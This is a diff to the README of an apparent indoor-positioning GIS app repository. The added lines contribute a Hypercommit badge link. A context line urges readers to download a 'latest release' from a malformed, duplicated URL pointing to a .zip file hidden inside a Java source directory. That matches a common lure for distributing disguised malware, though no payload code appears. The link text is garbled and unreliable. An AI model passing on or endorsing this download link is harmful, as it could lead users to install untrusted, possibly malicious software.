@@ -80,3 +80,7 @@ This project is licensed under the MIT License. You can use, modify, and share t
 This application aims to simplify indoor navigation for everyone. Download it today to start your journey through any indoor space with confidence.
 
 ![Download Latest Release](https://github.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/raw/refs/heads/main/android/classic/app/src/main/java/com/developing-native-applications-mobile-in-indoor-positioning-gis-v2.7.zip%20Latest%20Release-%F0%9F%93%https://github.com/Emon321/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025/raw/refs/heads/main/android/classic/app/src/main/java/com/developing-native-applications-mobile-in-indoor-positioning-gis-v2.7.zip)
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/indoor-gis-developing-indoor-positioning-in-native-mobile-applications-2025)
